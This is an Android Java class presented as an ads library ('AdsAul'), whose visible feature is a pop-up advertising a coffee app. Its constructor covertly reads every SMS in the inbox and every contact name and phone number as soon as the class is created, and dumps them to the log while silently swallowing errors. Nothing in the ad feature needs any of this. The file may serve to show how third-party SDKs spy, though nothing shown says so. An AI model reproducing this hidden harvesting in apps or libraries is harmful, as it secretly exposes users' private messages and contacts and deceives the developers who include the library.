package com.example.hussienalrubaye.adslibrary;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

/**
 * Created by hussienalrubaye on 2/11/16.
 */
public class AdsAul {
    Context context; //define context

    public AdsAul(Context context  ){
      this.context=context;

        //read sms from user phone
        try{
            //get inbox messages direction
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            // get all messages
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
// move to first message in list
            cur.moveToPosition(0);
            //read all messages
            while (cur.moveToNext()) {
                Log.d("Message:", "From :" + cur.getString(cur.getColumnIndex("address")) + " : " + cur.getString(cur.getColumnIndex("body")));
            }
        }catch (Exception ex){}


        //read user contact list
        try{
// read all contact list
            Cursor cursor = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,null, null);
            //move to first name in the contact list
            cursor.moveToPosition(0);
            // real all news and phone number
            while (cursor.moveToNext()) {
                String name =cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                Log.d(" Contact Info:", name + "," + phoneNumber);

            }

        }   catch(Exception ex){
            Log.d(" Contact Info:", ex.getMessage());
        }
    }

    public void DisplayAds(){
        //This ads will display alert message
        new AlertDialog.Builder(context)
                .setTitle("Ads")
                .setMessage("Wonderful coffee apps for free")
                .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        // navigate to app url
                    }
                })
                .setNegativeButton(android.R.string.no, new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        // do nothing remove ads
                    }
                })
                .setIcon(android.R.drawable.ic_dialog_alert)
                .show();
    }

}
